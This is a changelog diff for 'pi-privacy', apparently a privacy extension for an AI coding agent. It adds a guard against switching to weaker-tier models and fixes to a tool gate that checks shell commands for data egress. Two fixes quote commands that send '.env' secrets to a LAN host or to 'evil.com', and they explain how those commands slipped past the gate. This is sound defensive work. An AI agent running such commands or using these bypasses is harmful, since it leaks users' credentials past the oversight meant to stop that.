@@ -4,6 +4,48 @@ All notable changes to **pi-privacy** are documented here. The format follows
 [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and the project adheres to
 [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [0.5.0] — 2026-07-22
+
+### Added
+
+- **Posture-downgrade guard.** Switching to a weaker-tier model re-sends the whole
+  accumulated session history — everything the private channel was protecting — to the
+  new provider on the very next turn. No per-request gate can see this: nothing about the
+  request changed, only the ceiling over it. The guard warns on the transition when the
+  context is known to carry PII/secrets, and offers to revert the switch (via
+  `pi.setModel`), proceed, or proceed with redaction. New option `downgradePolicy`
+  (`warn` | `block` | `off`); with no UI a credential following the session downhill
+  reverts, mere PII is announced. Comparison is by **exposure**, not tier rank — new pure
+  module `src/posture/downgrade.ts` (`exposureLevel`, `assessDowngrade`,
+  `downgradeWarning`): tee-verified ≡ local (neither party can read the payload, so
+  moving between them is silent), while `tee-unverified` sits with `zdr-policy`, so a TEE
+  model whose attestation fails to land is correctly caught as a downgrade once
+  attestation resolves.
+
+### Fixed
+
+- **`.local` and other LAN hosts were graded "On-device".** `isLocalEndpoint()` accepted
+  any `.local` hostname, but mDNS names a *different machine on the network*. Two
+  consequences, both the exact overclaim this package exists to prevent: a custom provider
+  at `http://box.local` earned the green on-device badge **and** was exempted from the PII
+  gate; and in the tool gate `curl -d @.env http://drop.local/collect` assessed as
+  non-egress — a one-word bypass. Loopback is now strict (`localhost` + RFC 6761
+  subdomains, all of `127.0.0.0/8`, `::1`, `0.0.0.0`, IPv4-mapped v6) and everything else,
+  including RFC1918, is remote. Also fixes `[::1]` never matching (`URL.hostname` keeps
+  the brackets) and `127.0.0.2`–`127.255.255.254` being missed.
+- **A benign command could vouch for the rest of a shell line.** The tool gate judged the
+  whole `bash` command at once, so one loopback URL suppressed the egress binaries after
+  it: `curl http://localhost:3000/x && scp .env me@evil.com:/tmp` assessed as non-egress.
+  Each command in a line is now assessed separately (`splitCommands`, exported).
+- **`/verify` now emits the raw attestation report**, which the README has always promised
+  ("prints the raw report so you can take it to one") but the handler never did — it
+  fetched the report and dropped it, showing only the verdict. The checks here are
+  pragmatic ones, not a full verifier, so the evidence behind a verdict has to be
+  inspectable or "verified" is just our word for it. Verdict first, then the report.
+- The downgrade guard's post-attestation pass runs detached from any event context; the
+  extension now remembers whether the host can prompt (`hasUI`), so an interactive session
+  asks instead of silently applying the non-interactive fallback.
+
 ## [0.4.0] — 2026-07-13
 
 ### Added
@@ -78,6 +120,7 @@ All notable changes to **pi-privacy** are documented here. The format follows
   NEAR AI (report-body over HTTPS), observable ZDR enforcement for OpenRouter, on-device
   detection for loopback endpoints, and the `/verify` command.
 
+[0.5.0]: https://github.com/privateer-agent/pi-privacy/releases/tag/v0.5.0
 [0.4.0]: https://github.com/privateer-agent/pi-privacy/releases/tag/v0.4.0
 [0.3.0]: https://github.com/privateer-agent/pi-privacy/compare/v0.2.1...ca27cb6
 [0.2.1]: https://github.com/privateer-agent/pi-privacy/releases/tag/v0.2.1
